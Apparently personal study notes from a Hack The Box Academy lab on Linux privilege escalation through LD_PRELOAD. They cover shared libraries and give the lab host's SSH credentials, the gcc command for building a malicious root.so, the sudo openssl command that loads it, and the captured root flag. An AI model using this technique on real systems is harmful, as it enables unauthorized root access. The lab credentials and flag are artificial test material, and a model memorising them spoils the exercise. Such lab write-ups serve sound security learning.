#### Static Libraries
- Denoted by .a extension
- cannot be altered when compiled
#### Dynamically Linked Libraries
- denoted by .so extension
- can be modified to control the execution of the program that calls them

#### Specifying the locations of dlls
- Environment variables `LD_RUN_PATH`,  `LD_LIBRARY_PATH`, `LD_PRELOAD`
- placing them in default directories /lib or /usr/lib
- specifying another directory containing the libraries within the `/etc/ld.so.conf`
#### List all libraries required by /bin/ls
```
ldd /bin/ls
```

### Using LD_PRELOAD to Priv Esc
- Need a sudo user

## Questions

IP
```
10.129.62.179
```

SSH
```
ssh htb-student@10.129.62.179
```

Password
```
Academy_LLPE!
```

What privileges does the user have?
![[Pasted image 20240622210013.png]]

User has the LD_PRELOAD env var set and can execute openssl with sudo

Compile script
```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Execute script
```
sudo LD_PRELOAD=./root.so /usr/bin/openssl
```

Root Flag
```
root@NIX02:~# ls -l ../../root
total 16
drwxr-xr-x 2 root root 4096 Jan 25 11:28 cron_abuse
drwxrwxr-x 2 root root 4096 Jan 25 11:28 kernel_exploit
drwxr-xr-x 2 root root 4096 Jan 25 11:28 ld_preload
drwx------ 2 root root 4096 Jan 25 11:28 screen_exploit
root@NIX02:~# cat ../../root/ld_preload/flag.txt
6a9c151a599135618b8f09adc78ab5f1
root@NIX02:~# 
```

